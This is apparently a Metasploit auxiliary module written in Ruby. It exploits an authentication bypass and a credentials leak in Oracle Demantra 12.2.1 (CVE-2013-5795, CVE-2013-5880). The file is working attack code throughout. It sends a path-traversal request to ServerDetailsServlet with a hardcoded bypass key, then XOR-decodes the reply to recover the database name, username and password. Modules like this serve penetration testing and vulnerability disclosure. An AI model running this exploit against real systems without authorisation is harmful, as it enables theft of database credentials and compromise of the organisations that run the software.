##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Demantra Database Credentials Leak',
      'Description'    => %q{
        This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in
        combination with an authentication bypass. This way an unauthenticated user can retrieve
        the database name, username and password on any vulnerable machine.
      },
      'References'     =>
        [
          [ 'CVE', '2013-5795'],
          [ 'CVE', '2013-5880'],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5795/'],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/' ]
        ],
      'Author'         =>
        [
          'Oliver Gruskovnjak'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Feb 28 2014"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptBool.new('SSL',   [false, 'Use SSL', false])
      ])

    deregister_options('RHOST')
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('demantra', 'common', 'loginCheck.jsp', '..', '..', 'ServerDetailsServlet'),
      'vars_get' => {
        'UAK' => '406EDC5447A3A43551CDBA06535FB6A661F4DC1E56606915AC4E382D204B8DC1'
      }
    })

    if res.nil? or res.body.empty?
      vprint_error("No content retrieved")
      return
    end

    if res.code == 404
      vprint_error("File not found")
      return
    end

    if res.code == 200
      creds = ""

      vprint_status("String received: #{res.body.to_s}") unless res.body.blank?

      res.body.to_s.split(",").each do|c|
        i = c.to_i ^ 0x50
        creds += i.chr
      end
      print_good("Credentials decoded: #{creds}") unless creds.empty?
    end
  end
end
